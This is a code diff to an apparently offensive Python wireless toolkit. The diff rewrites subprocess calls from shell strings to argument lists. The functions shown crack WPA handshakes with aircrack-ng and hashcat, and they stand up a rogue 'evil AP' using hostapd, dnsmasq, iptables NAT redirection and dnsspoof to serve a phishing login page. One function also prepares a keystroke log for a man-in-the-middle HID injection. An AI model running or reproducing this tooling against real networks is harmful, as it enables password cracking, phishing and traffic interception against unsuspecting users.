@@ -147,13 +147,13 @@ def crack_handshakes():
     
     if method == "1":
         print(" Launching Aircrack-ng...")
-        subprocess.run(f"aircrack-ng {pcap_file} -w {wordlist}", shell=True)
+        subprocess.run(["aircrack-ng", pcap_file, "-w", wordlist])
     elif method == "2":
         hccapx = pcap_file.replace(".pcap", ".hccapx")
         print("🔄 Converting pcap to hccapx...")
-        subprocess.run(f"cap2hccapx {pcap_file} {hccapx}", shell=True)
+        subprocess.run(["cap2hccapx", pcap_file, hccapx])
         print(" Launching Hashcat...")
-        subprocess.run(f"hashcat -m 2500 {hccapx} {wordlist} --force", shell=True)
+        subprocess.run(["hashcat", "-m", "2500", hccapx, wordlist, "--force"])
     else:
         print("⚠️ Invalid choice.")
 
@@ -212,10 +212,10 @@ def evil_ap_mode():
     cleanup_services(iface)
 
     print("🌐 Configuring network interface...")
-    subprocess.run(f"sudo ip link set {iface} down", shell=True)
-    subprocess.run(f"sudo ip addr flush dev {iface}", shell=True)
-    subprocess.run(f"sudo ip addr add 10.0.0.1/24 dev {iface}", shell=True)
-    subprocess.run(f"sudo ip link set {iface} up", shell=True)
+    subprocess.run(["sudo", "ip", "link", "set", iface, "down"])
+    subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface])
+    subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
+    subprocess.run(["sudo", "ip", "link", "set", iface, "up"])
 
     hostapd_conf = f"""
 interface={iface}
@@ -245,24 +245,24 @@ log-dhcp
 
     # Start services
     print(f"📶 Starting Evil AP on {iface} with SSID: {ssid}")
-    subprocess.Popen(f"sudo hostapd loot/hostapd.conf", shell=True)
+    subprocess.Popen(["sudo", "hostapd", "loot/hostapd.conf"])
     time.sleep(2)
 
     print("🧠 Launching dnsmasq...")
-    subprocess.Popen(f"sudo dnsmasq -C loot/dnsmasq.conf", shell=True)
+    subprocess.Popen(["sudo", "dnsmasq", "-C", "loot/dnsmasq.conf"])
 
     print("💻 Hosting phishing login at http://10.0.0.1 ...")
-    subprocess.Popen("sudo python3 phish_server.py", shell=True)
+    subprocess.Popen(["sudo", "python3", "phish_server.py"])
 
     print("🔀 Enabling HTTP redirection with iptables...")
-    subprocess.run("sudo iptables -t nat -F", shell=True)
-    subprocess.run("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80", shell=True)
-    subprocess.run("sudo iptables -t nat -A POSTROUTING -j MASQUERADE", shell=True)
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
 
     print("🎯 Launching dnsspoof to redirect all DNS to 10.0.0.1")
     with open("loot/dnsspoof_hosts", "w") as f:
         f.write("10.0.0.1 *\n")
-    subprocess.Popen(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts", shell=True)
+    subprocess.Popen(["sudo", "dnsspoof", "-i", iface, "-f", "loot/dnsspoof_hosts"])
 
     print("Press CTRL+C to stop Evil AP.")
     try:
@@ -309,10 +309,10 @@ def mitm_hid_injection():
 
     # 🌐 Set up network
     cleanup_services(iface)
-    subprocess.run(f"sudo ip link set {iface} down", shell=True)
-    subprocess.run(f"sudo ip addr flush dev {iface}", shell=True)
-    subprocess.run(f"sudo ip addr add 10.0.0.1/24 dev {iface}", shell=True)
-    subprocess.run(f"sudo ip link set {iface} up", shell=True)
+    subprocess.run(["sudo", "ip", "link", "set", iface, "down"])
+    subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface])
+    subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
+    subprocess.run(["sudo", "ip", "link", "set", iface, "up"])
 
     with open("loot/hostapd.conf", "w") as f:
         f.write(f"""
@@ -382,13 +382,13 @@ setTimeout(() => {{
     open(keystroke_log, "a").close()
 
     print(f"📶 Broadcasting SSID: {fake}")
-    subprocess.Popen("sudo hostapd hostapd.conf", shell=True)
+    subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])
     time.sleep(2)
-    subprocess.Popen("sudo dnsmasq -C dnsmasq.conf", shell=True)
-    subprocess.run("sudo iptables -t nat -F", shell=True)
-    subprocess.run("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80", shell=True)
-    subprocess.run("sudo iptables -t nat -A POSTROUTING -j MASQUERADE", shell=True)
-    subprocess.Popen(f"sudo dnsspoof -i {iface} -f dnsspoof_hosts", shell=True)
+    subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
+    subprocess.Popen(["sudo", "dnsspoof", "-i", iface, "-f", "dnsspoof_hosts"])
 
     class HIDHandler(BaseHTTPRequestHandler):
         def do_GET(self):
